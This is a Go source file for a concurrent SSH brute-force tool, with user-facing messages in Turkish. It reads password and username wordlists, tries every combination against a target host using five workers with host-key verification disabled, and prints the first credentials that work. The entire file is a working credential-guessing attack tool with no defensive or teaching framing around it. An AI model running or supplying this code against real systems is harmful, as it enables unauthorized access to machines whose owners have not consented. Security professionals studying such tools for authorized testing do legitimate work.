package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func startAttack(passwords []string, usernames []string, hostname string) {
	var wg sync.WaitGroup
	countOfWorkers := 5

	jobs := make(chan [2]string, len(passwords)*len(usernames))

	go func() {
		for _, username := range usernames {
			for _, password := range passwords {
				jobs <- [2]string{username, password}
			}
		}
		close(jobs)
	}()

	for i := 0; i < countOfWorkers; i++ {
		wg.Add(1)
		go worker(i, &wg, jobs, hostname)
	}

	wg.Wait()
}

func worker(id int, wg *sync.WaitGroup, jobs <-chan [2]string, hostname string) {
	defer wg.Done()

	for job := range jobs {
		username := job[0]
		password := job[1]
		fmt.Printf("Worker %d: Kullanıcı Adı: %s, Şifre: %s\n", id, username, password)
		success := sshLogin(hostname, username, password)

		if success {
			fmt.Printf("Başarılı! Kullanıcı Adı: %s, Şifre: %s\n", username, password)
			break
		}
	}
}

func sshLogin(hostname, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	client, err := ssh.Dial("tcp", hostname, config)
	if err != nil {
		return false
	}
	defer client.Close()

	return true
}

func getWordList(path string) ([]string, error) {

	file, err := os.Open(path)

	if err != nil {
		return nil, err
	}

	fileScanner := bufio.NewScanner(file)
	fileScanner.Split(bufio.ScanLines)
	var fileLines []string

	for fileScanner.Scan() {
		fileLines = append(fileLines, fileScanner.Text())
	}

	file.Close()

	return fileLines, nil
}

func checkArgumentIsCorrect(arguments []string) int {

	if len(arguments) < 2 || (arguments[1] == "-p" || arguments[1] == "-P" || arguments[1] == "-u" || arguments[1] == "-U" || arguments[1] == "-h") {
		return -1
	}
	return 0
}

func main() {

	if len(os.Args) < 7 {
		fmt.Println("Eksik Argüman")
		fmt.Println("Lütfen -p <şifre> veya -P <wordlist> -u <kullanıcı adı> veya -U <kullanıcı adları> -h <hostname> veya -h <ip adresi> olacak şekilde yazınız")
		return
	} else if len(os.Args) > 7 {
		fmt.Println("Aşırı Argüman")
		fmt.Println("Lütfen -p <şifre> veya -P <wordlist> -u <kullanıcı adı> veya -U <kullanıcı adları> -h <hostname> veya -h <ip adresi> olacak şekilde yazınız")
		return
	}

	firstArgs := os.Args[1:3]
	secondArgs := os.Args[3:5]
	thirdArgs := os.Args[5:7]

	var errCode int

	if errCode = checkArgumentIsCorrect(firstArgs); errCode != 0 {
		fmt.Println("Hatalı Argüman kullanımı. Lütfen -p <şifre> -P <wordlist> olacak şekilde argümanları kullanınız")
	}

	if errCode = checkArgumentIsCorrect(secondArgs); errCode != 0 {
		fmt.Println("Hatalı Argüman kullanımı. Lütfen -u <Kullanıcı Adı> -U <wordlist> olacak şekilde argümanları kullanınız")
	}

	if errCode = checkArgumentIsCorrect(thirdArgs); errCode != 0 {
		fmt.Println("Hatalı Argüman kullanımı. Lütfen -h <hostname> olacak şekilde kullanınız.")
	}

	var passwords []string
	var usernames []string
	var target string

	switch firstArgs[0] {
	case "-p":
		passwords = append(passwords, firstArgs[1])
	case "-P":
		wordlist, err := getWordList(firstArgs[1])
		if err != nil {
			fmt.Println(wordlist)
			return
		}
		passwords = append(passwords, wordlist...)
	default:
		fmt.Println("-p veya -P parametresini kullanarak bir şifre veya wordlist belirtmelisiniz.")
		return
	}

	switch secondArgs[0] {
	case "-u":
		usernames = append(usernames, secondArgs[1])
	case "-U":
		wordlist, err := getWordList(secondArgs[1])
		if err != nil {
			fmt.Println(err)
		}
		usernames = append(usernames, wordlist...)
	default:
		fmt.Println("-u veya -U parametresini kullanarak bir şifre veya wordlist belirtmelisiniz.")
		return
	}

	target = thirdArgs[1]

	startAttack(passwords, usernames, target)

	fmt.Println(firstArgs)
	fmt.Println(secondArgs)
	fmt.Println(thirdArgs)
}
